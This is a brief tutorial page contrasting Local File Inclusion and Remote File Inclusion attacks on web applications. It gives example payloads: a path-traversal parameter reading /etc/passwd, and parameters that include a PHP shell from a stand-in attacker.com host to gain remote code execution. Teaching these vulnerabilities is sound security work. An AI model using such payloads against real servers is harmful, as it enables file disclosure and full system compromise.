Module 6›Chapter 5.5›LFI vs. RFI

Local File Inclusion (LFI)

LFI allows an attacker to read or execute files already present on the target server's filesystem. This is achieved by manipulating the input parameter that specifies a file path.

  • Source: Files on the local server (e.g., /etc/passwd, log files).
  • Impact: Information disclosure, local code execution (often combined with other techniques).

Example: ?page=../../../../etc/passwd to read the password file.

Remote File Inclusion (RFI)

RFI allows an attacker to include and execute arbitrary code from a remote server they control. This typically leads to immediate Remote Code Execution (RCE) on the target server.

  • Source: Files on an attacker-controlled remote server (e.g., http://attacker.com/shell.txt).
  • Impact: Direct Remote Code Execution (RCE), often leading to full system compromise.

Example: ?file=http://attacker.com/malicious.php to execute remote code.

Key Takeaway

The key difference between LFI and RFI is the source of the included file: local for LFI, remote for RFI. RFI is generally more dangerous due to direct RCE potential.
